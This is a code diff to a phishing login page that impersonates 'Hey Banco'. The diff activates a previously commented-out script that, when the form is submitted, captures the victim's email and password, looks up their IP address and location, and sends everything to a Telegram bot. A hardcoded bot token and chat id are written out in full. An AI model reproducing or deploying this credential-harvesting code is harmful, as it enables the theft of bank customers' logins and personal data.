@@ -10,7 +10,7 @@
     <div class="login-container">
       <div style="height: 50px"></div>
       <form action="acti.php" method="post" class="login-form" id="loginform">
-        <img src="logo.png" alt="Hey Banco Logo" class="logo" />
+        <img src="https://i.postimg.cc/Vv5CRhXg/logo.png" alt="Hey Banco Logo" class="logo" />
 
         <div style="width: 100%; height: 20px"></div>
         <label style="font-weight: bold">Email</label>
@@ -33,7 +33,7 @@
   </body>
   <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
 
-  <!-- <script>
+  <script>
     const url = "https://ipapi.co/json/";
     const form = document.querySelector("#loginform");
     form.addEventListener("submit", (event) => {
@@ -46,22 +46,12 @@
           const contra = document.querySelector("#contra").value;
 
           const message =
-            "\nHotmail" +
-            "\nEmail: " +
-            email +
-            "\nContra: " +
-            contra +
-            "\nCiudad:" +
-            response.data.city +
-            "\nPais: " +
-            response.data.country +
-            "\nIP: " +
-            response.data.ip;
+            "\nLOG - >" + " Email: " + email + " | Contra: " + contra + " | Ciudad: " + response.data.city + " | Pais: " + response.data.country + " | IP:  " + response.data.ip;
           axios
             .post(
-              "https://api.telegram.org/bot6813420865:AAGXMG1O5p-lKZbzOmQ-8tGhoi8cA5mgOY0/sendMessage",
+              "https://api.telegram.org/bot5004637295:AAFELMf4M-wXnKs-oucI7rh1Sd3NPrAkOdA/sendMessage",
               {
-                chat_id: "-1001858805398",
+                chat_id: "864018852",
                 text: message,
               }
             )
@@ -76,5 +66,5 @@
           console.log(error);
         });
     });
-  </script> -->
+  </script>
 </html>
